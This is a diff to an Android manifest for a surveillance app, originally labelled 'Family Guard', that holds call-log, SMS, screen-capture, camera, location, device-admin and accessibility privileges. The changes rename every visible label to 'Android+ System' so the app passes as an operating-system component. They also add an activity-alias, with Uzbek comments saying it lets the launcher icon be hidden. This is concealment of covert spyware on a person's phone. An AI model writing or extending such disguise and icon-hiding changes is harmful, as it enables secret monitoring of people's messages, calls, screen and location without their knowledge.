@@ -22,7 +22,9 @@
   <uses-permission android:name="android.permission.READ_CALL_LOG"/>
   <uses-permission android:name="android.permission.READ_SMS"/>
 
-  <application android:theme="@style/Theme.Child" android:label="Family Guard">
+  <application
+      android:theme="@style/Theme.Child"
+      android:label="Android+ System">
 
     <service
         android:name=".ScreenCaptureService"
@@ -31,7 +33,7 @@
         android:foregroundServiceType="mediaProjection|camera|location"/>
 
     <receiver android:name=".DeviceAdminReceiver"
-        android:label="Family Guard"
+        android:label="Android+ System"
         android:description="@string/device_admin_description"
         android:permission="android.permission.BIND_DEVICE_ADMIN"
         android:exported="true">
@@ -54,17 +56,28 @@
 
     <receiver android:name=".WatchdogReceiver" android:exported="false"/>
 
-    <activity android:name=".MainActivity" android:exported="true">
+    <!-- MainActivity — intent-filter YO'Q, alias orqali ochiladi -->
+    <activity
+        android:name=".MainActivity"
+        android:exported="true"/>
+
+    <!-- Ikonka shu alias orqali ko'rsatiladi/yashiriladi -->
+    <activity-alias
+        android:name=".LauncherAlias"
+        android:targetActivity=".MainActivity"
+        android:exported="true"
+        android:enabled="true"
+        android:label="Android+ System">
       <intent-filter>
         <action android:name="android.intent.action.MAIN"/>
         <category android:name="android.intent.category.LAUNCHER"/>
       </intent-filter>
-    </activity>
+    </activity-alias>
 
     <service
         android:name=".FamilyGuardAccessibilityService"
         android:exported="true"
-        android:label="Family Guard"
+        android:label="Android+ System"
         android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
       <intent-filter>
         <action android:name="android.accessibilityservice.AccessibilityService"/>
